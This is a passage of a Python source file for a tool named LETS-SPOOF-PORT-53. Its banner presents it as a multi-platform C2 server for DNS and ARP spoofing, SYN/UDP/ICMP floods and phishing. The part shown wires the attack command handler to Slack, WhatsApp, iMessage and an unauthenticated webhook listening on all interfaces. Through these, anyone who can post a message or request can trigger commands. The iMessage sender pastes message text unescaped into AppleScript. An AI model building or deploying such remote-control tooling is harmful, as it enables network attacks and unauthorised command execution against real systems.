    def __init__(self, handler: UnifiedBotHandler, config: Dict, db: DatabaseManager):
        self.handler = handler
        self.config = config
        self.db = db
        self.client = None
        self.running = False
        self.last_ts = {}
    
    def setup(self) -> bool:
        """Setup Slack bot"""
        if not SLACK_AVAILABLE:
            return False
        
        if not self.config.get('slack_token'):
            return False
        
        self.client = WebClient(token=self.config['slack_token'])
        return True
    
    def start(self):
        """Start Slack bot"""
        if self.client:
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.running = True
    
    def _monitor(self):
        """Monitor Slack for messages"""
        channel = self.config.get('slack_channel', 'general')
        
        while self.running:
            try:
                response = self.client.conversations_history(
                    channel=channel,
                    limit=5
                )
                
                if response['ok'] and response['messages']:
                    for msg in response['messages']:
                        if msg.get('text', '').startswith('!'):
                            ts = msg.get('ts')
                            if self.last_ts.get(channel) != ts:
                                self.last_ts[channel] = ts
                                cmd = msg['text'][1:].strip()
                                result = self.handler.execute_command(cmd, f"slack/{msg.get('user', 'unknown')}", "slack")
                                
                                self.db.log_message("slack", msg.get('user', 'unknown'), cmd, result.get('output', '')[:500])
                                
                                self.client.chat_postMessage(
                                    channel=channel,
                                    text=f"```{result.get('output', '')[:2000]}```\n*Execution time: {result.get('execution_time', 0):.2f}s*"
                                )
                
                time.sleep(2)
            except Exception as e:
                logger.error(f"Slack monitor error: {e}")
                time.sleep(10)
    
    def send_message(self, channel: str, message: str):
        """Send message to Slack"""
        try:
            self.client.chat_postMessage(channel=channel, text=message)
        except Exception as e:
            logger.error(f"Failed to send Slack message: {e}")

# =====================
# WHATSAPP BOT (via Selenium)
# =====================
class WhatsAppBot:
    """WhatsApp bot using Selenium"""
    
    def __init__(self, handler: UnifiedBotHandler, config: Dict, db: DatabaseManager):
        self.handler = handler
        self.config = config
        self.db = db
        self.driver = None
        self.running = False
        self.session_dir = WHATSAPP_SESSION_DIR
    
    def setup(self) -> bool:
        """Setup WhatsApp bot"""
        if not SELENIUM_AVAILABLE:
            return False
        
        # Check for Chrome driver
        if not shutil.which('chromedriver'):
            return False
        
        return True
    
    def start(self):
        """Start WhatsApp bot"""
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        """Run WhatsApp bot"""
        try:
            options = webdriver.ChromeOptions()
            options.add_argument('--user-data-dir=' + self.session_dir)
            options.add_argument('--disable-gpu')
            
            self.driver = webdriver.Chrome(options=options)
            self.driver.get('https://web.whatsapp.com')
            
            print(f"{Colors.YELLOW}📱 WhatsApp Web opened. Scan QR code to connect.{Colors.RESET}")
            
            # Wait for QR scan
            time.sleep(15)
            
            self.running = True
            
            # Monitor messages
            while self.running:
                try:
                    # Check for new messages (simplified)
                    time.sleep(5)
                except Exception as e:
                    logger.error(f"WhatsApp monitor error: {e}")
                    time.sleep(10)
                    
        except Exception as e:
            logger.error(f"WhatsApp bot error: {e}")
    
    def send_message(self, phone: str, message: str):
        """Send WhatsApp message"""
        if not self.driver:
            return False
        
        try:
            # Construct WhatsApp Web URL
            url = f"https://web.whatsapp.com/send?phone={phone}&text={urllib.parse.quote(message)}"
            self.driver.get(url)
            time.sleep(2)
            
            # Press Enter to send
            from selenium.webdriver.common.keys import Keys
            send_button = self.driver.find_element(By.XPATH, '//div[@contenteditable="true"]')
            send_button.send_keys(Keys.ENTER)
            
            return True
        except Exception as e:
            logger.error(f"Failed to send WhatsApp message: {e}")
            return False

# =====================
# iMESSAGE BOT (macOS only)
# =====================
class iMessageBot:
    """iMessage bot using AppleScript"""
    
    def __init__(self, handler: UnifiedBotHandler, config: Dict, db: DatabaseManager):
        self.handler = handler
        self.config = config
        self.db = db
        self.running = False
        
        # AppleScript commands
        self.send_script = '''
        tell application "Messages"
            send "%s" to buddy "%s" of service "E:%s"
        end tell
        '''
        
        self.listen_script = '''
        tell application "Messages"
            set unreadMessages to messages of chat 1 whose read is false
            repeat with msg in unreadMessages
                set msgContent to content of msg
                set msgSender to handle of sender of msg
                log msgContent
            end repeat
        end tell
        '''
    
    def setup(self) -> bool:
        """Setup iMessage bot"""
        if platform.system() != 'Darwin':  # macOS only
            return False
        
        if not APPLESCRIPT_AVAILABLE:
            return False
        
        return True
    
    def start(self):
        """Start iMessage bot"""
        if self.setup():
            thread = threading.Thread(target=self._monitor, daemon=True)
            thread.start()
            self.running = True
    
    def _monitor(self):
        """Monitor iMessage for commands"""
        while self.running:
            try:
                # Check for new messages
                # Simplified - would need proper AppleScript implementation
                time.sleep(10)
            except Exception as e:
                logger.error(f"iMessage monitor error: {e}")
                time.sleep(10)
    
    def send_message(self, phone: str, message: str, service: str = "iMessage"):
        """Send iMessage"""
        try:
            script = self.send_script % (message, phone, service)
            applescript.AppleScript(script).run()
            return True
        except Exception as e:
            logger.error(f"Failed to send iMessage: {e}")
            return False

# =====================
# WEBHOOK SERVER
# =====================
class WebhookServer:
    """Webhook server for receiving commands"""
    
    def __init__(self, handler: UnifiedBotHandler, db: DatabaseManager, port: int = 5000):
        self.handler = handler
        self.db = db
        self.port = port
        self.app = None
        self.socketio = None
        self.running = False
    
    def setup(self) -> bool:
        """Setup webhook server"""
        if not FLASK_AVAILABLE:
            return False
        
        self.app = Flask(__name__)
        self.socketio = SocketIO(self.app, cors_allowed_origins="*")
        
        @self.app.route('/webhook/<webhook_id>', methods=['GET', 'POST'])
        def webhook(webhook_id):
            """Handle webhook requests"""
            data = request.get_json() or request.form.to_dict() or {'message': request.args.get('message', '')}
            
            command = data.get('command', data.get('message', data.get('text', '')))
            platform = data.get('platform', 'webhook')
            sender = data.get('sender', 'anonymous')
            
            if command:
                result = self.handler.execute_command(command, sender, platform)
                self.db.log_message(platform, sender, command, result.get('output', '')[:500])
                return jsonify(result)
            
            return jsonify({'status': 'ok', 'message': 'No command received'})
        
        @self.app.route('/health', methods=['GET'])
        def health():
            return jsonify({'status': 'healthy', 'timestamp': datetime.datetime.now().isoformat()})
        
        return True
    
    def start(self):
        """Start webhook server"""
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
            self.running = True
            print(f"{Colors.GREEN}✅ Webhook server started on port {self.port}{Colors.RESET}")
    
    def _run(self):
        """Run Flask server"""
        try:
            self.socketio.run(self.app, host='0.0.0.0', port=self.port, debug=False)
        except Exception as e:
            logger.error(f"Webhook server error: {e}")

# =====================
# MAIN APPLICATION
# =====================
class LetsSpoofPort53:
    """Main application class"""
    
    def __init__(self):
        # Load configuration
        self.config = self._load_config()
        
        # Initialize components
        self.db = DatabaseManager()
        self.spoof_engine = SpoofingEngine(self.db)
        self.handler = UnifiedBotHandler(self.db, self.spoof_engine)
        
        # Initialize bots
        self.discord_bot = DiscordBot(self.handler, self.config, self.db)
        self.telegram_bot = TelegramBot(self.handler, self.config, self.db)
        self.slack_bot = SlackBot(self.handler, self.config, self.db)
        self.whatsapp_bot = WhatsAppBot(self.handler, self.config, self.db)
        self.imessage_bot = iMessageBot(self.handler, self.config, self.db)
        self.webhook_server = WebhookServer(self.handler, self.db, self.config.get('webhook_port', 5000))
        
        self.running = True
    
    def _load_config(self) -> Dict:
        """Load configuration"""
        default_config = {
            'discord_token': '',
            'telegram_api_id': '',
            'telegram_api_hash': '',
            'telegram_bot_token': '',
            'slack_token': '',
            'slack_channel': 'general',
            'webhook_port': 5000,
            'enable_discord': False,
            'enable_telegram': False,
            'enable_slack': False,
            'enable_whatsapp': False,
            'enable_imessage': False,
            'enable_webhook': True
        }
        
        try:
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE, 'r') as f:
                    config = json.load(f)
                    return {**default_config, **config}
        except Exception as e:
            logger.error(f"Failed to load config: {e}")
        
        return default_config
    
    def save_config(self):
        """Save configuration"""
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump(self.config, f, indent=4)
        except Exception as e:
            logger.error(f"Failed to save config: {e}")
    
    def print_banner(self):
        """Print banner"""
        banner = f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.PURPLE}        🔮 LETS-SPOOF-PORT-53 - Ultimate Multi-Platform C2 Server          {Colors.CYAN}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.BLUE}  • DNS Port 53 Spoofing (Specialized)    • IP/MAC/ARP/DNS Spoofing        {Colors.CYAN}║
║{Colors.BLUE}  • Discord | Telegram | Slack | WhatsApp | iMessage | Webhooks      {Colors.CYAN}║
║{Colors.BLUE}  • 1000+ Security Commands               • Flood Generation (ICMP/SYN/UDP){Colors.CYAN}║
║{Colors.BLUE}  • Phishing Suite                        • Network Scanning (Nmap/Dig)    {Colors.CYAN}║
║{Colors.BLUE}  • Real-time Threat Detection             • Graphical Reports             {Colors.CYAN}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.GREEN}💡 Type 'help' for command list{Colors.RESET}
{Colors.YELLOW}🎯 Specialized DNS Port 53 spoofing available{Colors.RESET}
{Colors.CYAN}📱 Multi-platform bot support ready{Colors.RESET}
        """
        print(banner)
    
    def setup_bots(self):
        """Setup and start bots"""
        print(f"\n{Colors.CYAN}🤖 Bot Configuration{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*50}{Colors.RESET}")
        
        # Discord
        if not self.config.get('discord_token') and not self.config.get('enable_discord'):
            token = input(f"{Colors.YELLOW}Enter Discord bot token (or press Enter to skip): {Colors.RESET}").strip()
            if token:
                self.config['discord_token'] = token
                self.config['enable_discord'] = True
                self.save_config()
        
        if self.config.get('discord_token') and self.discord_bot.setup():
            self.discord_bot.start()
            print(f"{Colors.GREEN}✅ Discord bot starting...{Colors.RESET}")
        
        # Telegram
        if not self.config.get('telegram_api_id') and not self.config.get('enable_telegram'):
            api_id = input(f"{Colors.YELLOW}Enter Telegram API ID (or press Enter to skip): {Colors.RESET}").strip()
            if api_id:
                self.config['telegram_api_id'] = api_id
                self.config['telegram_api_hash'] = input(f"{Colors.YELLOW}Enter Telegram API Hash: {Colors.RESET}").strip()
                self.config['telegram_bot_token'] = input(f"{Colors.YELLOW}Enter Telegram Bot Token (optional): {Colors.RESET}").strip()
                self.config['enable_telegram'] = True
                self.save_config()
        
        if self.config.get('telegram_api_id') and self.telegram_bot.setup():
            self.telegram_bot.start()
            print(f"{Colors.GREEN}✅ Telegram bot starting...{Colors.RESET}")
        
        # Slack
        if not self.config.get('slack_token') and not self.config.get('enable_slack'):
            token = input(f"{Colors.YELLOW}Enter Slack bot token (or press Enter to skip): {Colors.RESET}").strip()
            if token:
                self.config['slack_token'] = token
                self.config['slack_channel'] = input(f"{Colors.YELLOW}Enter Slack channel name (default: general): {Colors.RESET}").strip() or 'general'
                self.config['enable_slack'] = True
                self.save_config()
        
        if self.config.get('slack_token') and self.slack_bot.setup():
            self.slack_bot.start()
            print(f"{Colors.GREEN}✅ Slack bot starting...{Colors.RESET}")
        
        # WhatsApp
        if not self.config.get('enable_whatsapp'):
            enable = input(f"{Colors.YELLOW}Enable WhatsApp bot? (y/n) [requires Chrome]: {Colors.RESET}").strip().lower()
            if enable == 'y':
                self.config['enable_whatsapp'] = True
                self.save_config()
        
        if self.config.get('enable_whatsapp') and self.whatsapp_bot.setup():
            self.whatsapp_bot.start()
            print(f"{Colors.GREEN}✅ WhatsApp bot starting... (scan QR in Chrome){Colors.RESET}")
        
        # iMessage (macOS only)
        if platform.system() == 'Darwin' and not self.config.get('enable_imessage'):
            enable = input(f"{Colors.YELLOW}Enable iMessage bot? (y/n) [macOS only]: {Colors.RESET}").strip().lower()
            if enable == 'y':
                self.config['enable_imessage'] = True
                self.save_config()
        
        if self.config.get('enable_imessage') and self.imessage_bot.setup():
            self.imessage_bot.start()
            print(f"{Colors.GREEN}✅ iMessage bot starting...{Colors.RESET}")
        
        # Webhook server
        if self.config.get('enable_webhook', True):
            self.webhook_server.start()
            print(f"{Colors.GREEN}✅ Webhook server starting on port {self.config.get('webhook_port', 5000)}{Colors.RESET}")
    
    def run(self):
        """Main application loop"""
        # Clear screen and show banner
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        
        # Setup bots
        self.setup_bots()
        
        print(f"\n{Colors.GREEN}✅ System ready! Type 'help' for commands.{Colors.RESET}")
        print(f"{Colors.CYAN}📊 Database: {DATABASE_FILE}{Colors.RESET}")
        print(f"{Colors.PURPLE}🎯 Specialized DNS Port 53 spoofing: spoof_dns53 <target> <domain> <fake_ip>{Colors.RESET}\n")
        
        # Main command loop
        while self.running:
            try:
                prompt = f"{Colors.CYAN}🔮{Colors.RESET} "
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                if command.lower() == 'exit':
                    self.running = False
                    print(f"{Colors.YELLOW}👋 Goodbye!{Colors.RESET}")
                    break
                
                elif command.lower() == 'clear':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    self.print_banner()
                    continue
                
                # Execute command
                result = self.handler.execute_command(command)
                
                if result.get('success'):
                    output = result.get('output', '')
                    if isinstance(output, dict):
                        output = json.dumps(output, indent=2)
                    
                    print(output)
                    if result.get('execution_time'):
                        print(f"\n{Colors.GREEN}✅ Executed in {result['execution_time']:.2f}s{Colors.RESET}")
                else:
                    print(f"{Colors.RED}❌ Error: {result.get('output', 'Unknown error')}{Colors.RESET}")
                
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.RED}❌ Error: {e}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        # Cleanup
        self.db.close()
        
        print(f"\n{Colors.GREEN}✅ Shutdown complete.{Colors.RESET}")

# =====================
# MAIN ENTRY POINT
# =====================
def main():
    """Main entry point"""
    try:
        # Check Python version
        if sys.version_info < (3, 7):
            print(f"{Colors.RED}❌ Python 3.7 or higher required{Colors.RESET}")
            sys.exit(1)
        
        # Check for root privileges (optional)
        if platform.system().lower() == 'linux' and os.geteuid() != 0:
            print(f"{Colors.YELLOW}⚠️  Warning: Running without root privileges{Colors.RESET}")
            print(f"{Colors.YELLOW}   Some spoofing features may not work properly{Colors.RESET}")
            print(f"{Colors.YELLOW}   Run with sudo for full functionality{Colors.RESET}")
            time.sleep(2)
        
        # Create and run application
        app = LetsSpoofPort53()
        app.run()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()